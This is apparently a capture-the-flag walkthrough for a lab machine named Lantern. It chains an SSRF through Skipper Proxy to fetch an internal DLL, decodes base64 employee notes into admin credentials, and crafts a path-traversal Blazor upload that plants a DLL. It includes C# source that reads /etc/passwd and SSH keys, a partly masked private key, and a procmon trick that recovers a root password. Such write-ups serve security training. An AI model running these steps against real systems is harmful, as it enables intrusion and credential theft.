      "System.Security.dll": "sha256-lVo1IzpQ8ApPfXku3TfD+\/WMupxwhj27kxNklLs00uM=",
      "System.ServiceModel.Web.dll": "sha256-u6BruHSOCTTwM3mYmrZrI4ZapE+BXNjEhCEhZzncb8Q=",
      "System.ServiceProcess.dll": "sha256-q9qiSJlSYsOOAiGL2eoKMB6tmGWJ0jiiiV03QkJj+9Y=",
      "System.Text.Encoding.CodePages.dll": "sha256-h4c5zE7USMsMhnXdicO+QFRHhrSH00yG+o4hRoqmqsI=",
      "System.Text.Encoding.Extensions.dll": "sha256-VKQUSIrhN95oGK0ZNOPersGZUsrV8OkM5B\/izDGHaeI=",
      "System.Text.Encoding.dll": "sha256-cvkUmV\/SjtZC2SSfM3Z+P0+gbORa\/QUTnqYefItcMGo=",
      "System.Text.Encodings.Web.dll": "sha256-eWzqi7I99oo4C6cURzIg\/VRsDO8GfDDg9BU7xHWhshI=",
      "System.Text.Json.dll": "sha256-PNCDoNNxxyyeGxORbdIYh0kYj7UA+nLzlH+TzAjJtGU=",
      "System.Text.RegularExpressions.dll": "sha256-qoZcnZH56UJS6ZNiULVv45neh+C5fylKYXWVVCBoVZI=",
      "System.Threading.Channels.dll": "sha256-iVA9v1W3Kh8tsRVShEC5puyrQ5z8K8Jd9NG13NNGNcg=",
      "System.Threading.Overlapped.dll": "sha256-4f7W3R6ayi71vj8Dx0V+b6LKWyBbWgXzIvYoVx6sB\/E=",
      "System.Threading.Tasks.Dataflow.dll": "sha256-brkgW8gANJqDXLXZdLO\/4lBjsSI1ePj34x1ns3cfrew=",
      "System.Threading.Tasks.Extensions.dll": "sha256-PENIL2r6939Zb5O7Fbd79vTqPJGtG7e4rZNo8t8GOpA=",
      "System.Threading.Tasks.Parallel.dll": "sha256-O2W\/J4L8RL3MogHSrgHco2ZB00Q44wpJi59+l+RenbA=",
      "System.Threading.Tasks.dll": "sha256-4DG5EctwgYdGf2XhwKU1V\/kDFo1zDwHRt+\/\/MlbxJIk=",
      "System.Threading.Thread.dll": "sha256-Eu265Abl4uYVdiEC1SiBUm1CCZ7C+t\/wHqnKgtenUJc=",
      "System.Threading.ThreadPool.dll": "sha256-eR1VbM1uBfWEvwE9103JLehTShaojDIfOzAEL3BRtek=",
      "System.Threading.Timer.dll": "sha256-ohxHNOfivKoEfv6hFt3hRJrUrM7eRLPdX16pZ3sl40w=",
      "System.Threading.dll": "sha256-PJukAfA8ombxR1eZIWeENQmv9cTirn98W+tMp9JcJN8=",
      "System.Transactions.Local.dll": "sha256-kynD5I7qlEINTpHQAx9OCNHgDSG2MiaP7eKr5nE2ux0=",
      "System.Transactions.dll": "sha256-8D1kOFTvSoOImIhguPn7hcE9jDscPMoiXNDmMkLIhZQ=",
      "System.ValueTuple.dll": "sha256-oNAUfyqU\/GxYAN27YzGmESuB04CIUSWi\/d0X1whLjbE=",
      "System.Web.HttpUtility.dll": "sha256-5J7arVRsJc4JnZXrXNijEu9GyuzstA7oWh5N+BcUgmE=",
      "System.Web.dll": "sha256-jL2UY\/jFcH+aR4qy5E5D8aEpUPs0QUPeAen5UVcZyR8=",
      "System.Windows.dll": "sha256-8bl48xmJJ3TBcL+t29aLb660\/zfuxABv0NlNswPdsXE=",
      "System.Xml.Linq.dll": "sha256-PW5GMzZw4Kfb+PxHM\/3esXbvflMgxv2Gozi4c8r+KLA=",
      "System.Xml.ReaderWriter.dll": "sha256-92YmEAsQ+w8VKPUIZtNcPiSJ17bjTPtT8PmsI8Q0sGI=",
      "System.Xml.Serialization.dll": "sha256-YgESAq2VAp6Dm+Wp19D+FRkDgZk\/MZ3tJwB2SuRu7Xk=",
      "System.Xml.XDocument.dll": "sha256-reoziM29CWZA9uIQMVdtm7s9yIQCuanDqA2ELdwILEs=",
      "System.Xml.XPath.XDocument.dll": "sha256-yVwzItpv4vHQDwQCqM78Ydv2uHtSJYcZWJ1ZaRW\/ftc=",
      "System.Xml.XPath.dll": "sha256-4axHEHFvTq1\/VzammSA38SdUn4qbE\/4070jr6gQHvco=",
      "System.Xml.XmlDocument.dll": "sha256-S+Xk7z\/96t8ab30tKeYkqJi8fCecr7VDKhYGYUyWoTo=",
      "System.Xml.XmlSerializer.dll": "sha256-8phryTFy1MDMCmjKD0tOs071P7GjND0DJdiSUZBpBPc=",
      "System.Xml.dll": "sha256-Rg18wjp7\/BZHM0dC51OnrC39cUCu25BOS9+i8r7bUrM=",
      "System.dll": "sha256-YKqpzE+7ICNb3IBWe6kXM+dCR18TTaRnThuOy6NLcG4=",
      "WindowsBase.dll": "sha256-k04wZob3UNWysInC\/KRbcfiSMMSXDv56yL6raT6AnZk=",
      "mscorlib.dll": "sha256-veli+XvWHzkA3s4t4DKI+XiyNMpfHQjiO002+ExANkU=",
      "netstandard.dll": "sha256-O9JhHo5KqxkmwmapuxuhG\/iMRV7RHcrCDO9z+yv+8yI=",
      "System.Private.CoreLib.dll": "sha256-6rKu8tPdUGsvbSpesoNMVzbx7bNqPRMPV34eI7vSYaQ=",
      "InternaLantern.dll": "sha256-pblWkC\/PhCCSxn1VOi3fajA0xS3mX\/\/RC0XvAE\/n5cI="
    },
    "extensions": null,
    "lazyAssembly": null,
    "libraryInitializers": null,
    "pdb": {
      "InternaLantern.pdb": "sha256-E8WICkNg65vorw8OEDOe6K9nJxL0QSt1S4SZoX5rTOY="
    },
    "runtime": {
      "dotnet.timezones.blat": "sha256-KsGUR9nqtXb3Hy6IrNlnc1HoSS+AFlsXTX9rq4oChtA=",
      "icudt.dat": "sha256-Zuq0dWAsBm6\/2lSOsz7+H9PvFaRn61KIXHMMwXDfvyE=",
      "icudt_CJK.dat": "sha256-WPyI4hWDPnOw62Nr27FkzGjdbucZnQD+Ph+GOPhAedw=",
      "icudt_EFIGS.dat": "sha256-4RwaPx87Z4dvn77ie\/ro3\/QzyS+\/gGmO3Y\/0CSAXw4k=",
      "icudt_no_CJK.dat": "sha256-OxylFgLJlFqixsj+nLxYVsv5iZLvfIKMpLf9hrWaChA=",
      "dotnet.wasm": "sha256-JlqjjT2GZWeJko9+pitVfjjmJeEbi4AibzTQr5zTISo=",
      "dotnet..lzvsyl6wav.js": "sha256-6AcYHsbEEdBjeNDUUvrQZuRqASd62mZgQgxz4uzTVGU="
    },
    "satelliteResources": null
  }
}
```




```json
employee1.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SGVhZCBvZiBzYWxlcyBkZXBhcnRtZW50LCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBqb2huLnNAZXhhbXBsZS5jb20=")); employee2.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGFubnkudEBleGFtcGxlLmNvbQ==")); employee3.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("RnVsbFN0YWNrIGRldmVsb3BlciwgZW1lcmdlbmN5IGNvbnRhY3Q6ICs0NDEyMzQ1Njc4LCBlbWFpbDogY2F0aGVyaW5lLnJAZXhhbXBsZS5jb20=")); employee4.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("UFIsIGVtZXJnZW5jeSBjb250YWN0OiArNDQxMjM0NTY3OCwgZW1haWw6IGxhcmEuc0BleGFtcGxlLmNvbQ==")); employee5.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("SnVuaW9yIC5ORVQgZGV2ZWxvcGVyLCBlbWVyZ2VuY3kgY29udGFjdDogKzQ0MTIzNDU2NzgsIGVtYWlsOiBsaWxhLnNAZXhhbXBsZS5jb20=")); employee6.InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE="));
```

```json
- Head of sales department, emergency contact: +4412345678, email: [john.s@example.com](mailto:john.s@example.com)
- HR, emergency contact: +4412345678, email: [anny.t@example.com](mailto:anny.t@example.com)
- FullStack developer, emergency contact: +4412345678, email: [catherine.r@example.com](mailto:catherine.r@example.com)
- PR, emergency contact: +4412345678, email: [lara.s@example.com](mailto:lara.s@example.com)
- Junior .NET developer, emergency contact: +4412345678, email: [lila.s@example.com](mailto:lila.s@example.com)
- System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!
```



password port 3000 admin:AJbFA_Q@925p9ap#22

exploit

```bash
dotnet new console -c test  
dotnet add package Microsoft.AspNetCore.Components --version 6.0.0
```


```json
POST /_blazor?id=742ktb9GuO_0Si0QClJe4g HTTP/1.1
Host: lantern.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://lantern.htb:3000/
Content-Type: text/plain;charset=UTF-8
X-Requested-With: XMLHttpRequest
X-SignalR-User-Agent: Microsoft SignalR/0.0 (0.0.0-DEV_BUILD; Unknown OS; Browser; Unknown Runtime Version)
Content-Length: 187
Origin: http://lantern.htb:3000
Connection: close
Priority: u=4
Cache-Control: max-age=0

ÚÀ·BeginInvokeDotNetFromJS¡4À¬NotifyChangeÙª[[{"blob":{},"size":4608,"name":"../../../../../../opt/components/xpl.dll","id":1,"lastModified":"2024-08-24T03:27:34.810Z","contentType":"application/x-msdos-program"}]]
```




\
Here is my note  
# user  
  
## lantern.htb, when you visit the webserver the response server show that it is using Skipper Proxy and it has SSRF  
  
[https://www.exploit-db.com/exploits/51111](https://www.exploit-db.com/exploits/51111)  
  
  
  
## Add the x-skipper-proxy to header and make request to  
  
[http://lantern.htb/_framework/InternaLantern.dll](http://lantern.htb/_framework/InternaLantern.dll)  
  
Host: BOX_IP  
  
...  
  
User-Agent: ...  
  
X-Skipper-Proxy: localhost  
  
  
  
## decompile the dll  
  
ilspycmd InternaLantern.dll -o source_code  
  
## there is base64 string  
  
  
  
new Employee  
  
                                                {  
  
                                                        Uid = "POMBS",  
  
                                                        Name = "Travis",  
  
                                                        SecondName = "Duarte",  
  
                                                        BirthDay = new DateTime(1999, 7, 23).ToShortDateString(),  
  
                                                        JoinDate = new DateTime(2024, 1, 21).ToShortDateString(),  
  
                                                        Salary = 90000,  
  
                                                        InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTo ###WxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE="))  
  
                                                }  
  
## decode it  
  
System administrator, First day: 21/1/2024, Initial credentials admin:@AJbFA2###ap#22. Ask to change after first login!  
  
  
  
admin:AJbFA_Q@92###ap#22  
  
  
  
## this password can be use in [http://lantern.htb:3000/](http://lantern.htb:3000/)  
  
  
  
## get user  
  
  
  
## Install this burpsuite extension in burpsuite store  
  
[https://portswigger.net/bappstore/8a87b0...8bdd18e1d4](https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4)  
  
  
  
## there will be BTP menu in burpsuite menu bar if it's installed successfully  
  
## now visit Upload Content, before you upload anything, we need to change the dll path to /opt/components/, by default it uploads to " Upload directory /var/www/sites/lantern.htb/static/images "  
  
## make sure to clean your burpsuite proxy history request to make this much easier  
  
## intercept on, and upload the dll  
  
## the first request has body like this  
  
  
  
¹À·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙ[[{"id":1,"lastModified":"2024-08-18T01:48:45.336Z","name":"exploit.dll","size":4096,"contentType":"application/x-msdos-program","blob":{}}]]  
  
  
  
## right click and select extensions then Blazor Traffic Processor and Send to BTP  
  
## now deserialize the input, modify the path to this, make sure the option is from Blazor -> Json in the top bar  
  
[{  
  
  "Target": "BeginInvokeDotNetFromJS",  
  
  "Headers": 0,  
  
  "Arguments": [  
  
      "2",  
  
      "null",  
  
      "NotifyChange",  
  
      2,  
  
      [[{  
  
        "blob": {},  
  
        "size": 4096,  
  
        "name": "../../../../../../../../../../../../../../../../../opt/components/exploit.dll",  
  
        "id": 1,  
  
        "lastModified": "2024-08-18T01:48:45.336Z",  
  
        "contentType": "application/x-msdos-program"  
  
      }]]  
  
  ],  
  
  "MessageType": 1  
  
}]  
  
  
  
## copy the json and edit it from JSON->Blazor  
  
## and click serialize, copy the output to the intercept request overwriting the previous one  
  
ûÀ·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙË[[{"blob":{},"size":4096,"name":"../../../../../../../../../../../../../../../../../opt/components/exploit.dll","id":1,"lastModified":"2024-08-18T01:48:45.336Z","contentType":"application/x-msdos-program"}]]  
  
  
  
## generated exploit.dll can be found at the bottom of this writeup  
  
  
  
## the site output this  
  
Name: ../../../../../../../../../../../../../../../../../opt/components/exploit.dll  
  
Last modified: 8/18/2024 1:48:45 AM +00:00  
  
Size (bytes): 4096  
  
Content type: application/x-msdos-program  
  
  
  
## now you can search exploit module and get tomas id_rsa  
  
-----BEGIN OPENSSH PRIVATE KEY-----  
  
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn  
  
NhAAAAAwEAAQAAAYEAsKi2+IeDOJDaEc7xXczhegyv0iCr7HROTIL8srdZQTuHwffUdvTq  
  
X6r16o3paqTyzPoEMF1aClaohwDBeuE8NHM938RWybMzkXV/Q62dvPba/+DCIaw0SGfEx2  
  
j8KhTwIfkBpiFnjmtRr/79Iq9DpnReh7CS++/dlIF0S9PU54FWQ9eQeVT6mK+2G4JcZ0Jg  
  
aYGuIS1XpfmH/rhxm1woElf2/DJkIpVplJQgL8qOSRJtneAW5a6XrIGWb7cIeTSQQUQ/zS  
  
go3BtI9+YLG3KTXTqfvgZUlK/6Ibt8/ezSvFhXCMt8snVfEvI1H0BlxOisx6ZLFvwRjCi2  
  
xsYxb/8ZAXOUaCZZrTL6YCxp94Xz5eCQOXexdqekpp0RFFze2V6zw3+h+SIDNRBB/naf5i  
  
9pTW/U9wGUGz+ZSPfnexQaeu/DL016kssVWroJVHC+vNuQVsCLe6dvK8xq7UfleIyjQDDO  
  
7ghXLZAvVdQL8b0TvPsLbp5eqgmPGetmH7Q76HKJAAAFiJCW2pSQltqUAAAAB3NzaC1yc2  
  
EAAAGBALCotviHgziQ2hHO8V3M4XoMr9Igq+x0TkyC/LK3WUE7h8H31Hb06l+q9eqN6Wqk  
2###beGjWfO7Rzbo+jXq1wcPVh7/0b6Nsbrvu/gyV8La35q7ujrO8CvzIquyOP+Em1eKFrdpp  
  
91Bwx2##g80DpEK+fXvMOB9i2xdqobBL5qr0ZdKksWwC+Ak9+EaSpckj  
  
olQy5/DQCKsBQerid4rWMqTQRJ4LuThULM3pykXS5ZTcnfxk05qAcEv7oIljje/X/yu/aA  
  
7569eG+0IqbVOf6sxPIU1MLwbPD6WRq2qecSf5cBrVwMcbY4tUHEjZj9c18f1uqM1wP8jX  
  
zXIeaAndF2ndQcl/0CihZj9dY2WXRjDwAAAMEAxZv9saLa9LSqx4AvLT2U/a4u8OIepMaN  
  
x6DMDmRu3UY/rq13awL4YsXYF6h4c8V7rSPYAl+HRfnxzlLOK+ALU47n+qKDRcnI47e/Zv  
  
Zry8Yy605aCCKTyQ6O5ppFt1iKkxmUo7glCnrNyvna6dj8qX9hy2qY+sUiUgsLbKz5e9tP  
  
vpPttZZSNoWoBOkcAihJhIrs4GF5fj5t3gR2RA2qGlJ4C2R80Qbv2QAnroevpnoYKko/s9  
  
2VfNjWIV4Eq/DnAAAADXRvbWFzQGxhbnRlcm4BAgMEBQ==  
  
-----END OPENSSH PRIVATE KEY-----  
  
  
  
ssh -i tomas.key tomas@lantern.htb  
  
  
  
# root  
  
ps -aef  
  
## find this pid  
  
root      570731  570726  0 03:10 pts/0    00:00:00 nano /root/automation.s  
  
  
  
sudo /usr/bin/procmon -p 570731 -e write  
  
## wait for few minutes and hit F6  
  
## there will be db file exported to your directory  
  
## transfer it to your machine and use sqlite3  
  
  
  
sqlite3 procmon.db  
  
sqlite> .output out.txt  
  
sqlite> SELECT hex(substr(arguments, 9, resultcode))  FROM ebpf  WHERE resultcode > 0  ORDER BY timestamp;  
  
  
  
## copy the out.txt to cyberchef and use from hex recipe, download the Output and cat it  
  
$ cat download.dat  
  
e  
  
e  
  
e  
  
echo Q 33EEd2##MBB | s uuddoo . //bbaacckkuupp..sshh  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
e  
  
echo Q 33EEd2##MBB |  
  
  
  
## there we can find root password, remote the duplicate  
  
su root  
  
Q3E2##B  
  
  
  
root@lantern:~# id  
  
uid=0(root) gid=0(root) groups=0(root)  
  
  
  
## make exploit.dll  
  
dotnet new classlib -n exploit  
  
dotnet add package Microsoft.AspNetCore.Components --version 6.0.0  
  
modify the Class1.cs to  
  
  
  
using Microsoft.AspNetCore.Components;  
  
using Microsoft.AspNetCore.Components.Rendering;  
  
using System.IO;  
  
  
  
namespace exploit  
  
```c#
{  
  
    public class Component : ComponentBase  
  
    {  
  
        protected override void BuildRenderTree(RenderTreeBuilder builder)  
  
        {  
  
            base.BuildRenderTree(builder);  
  
            string file = File.ReadAllText("/etc/passwd");  
  
            //string file = File.ReadAllText("/home/tomas/user.txt");  
  
            //string file = File.ReadAllText("/home/tomas/.ssh/id_rsa");  
  
            builder.AddContent(0, file);  
  
        }  
  
    }  
  
}  
```
  
  
  
dotnet build -c Release  
  
  
  
## the compiled dll is in bin/Release/net6.0/exploit.dll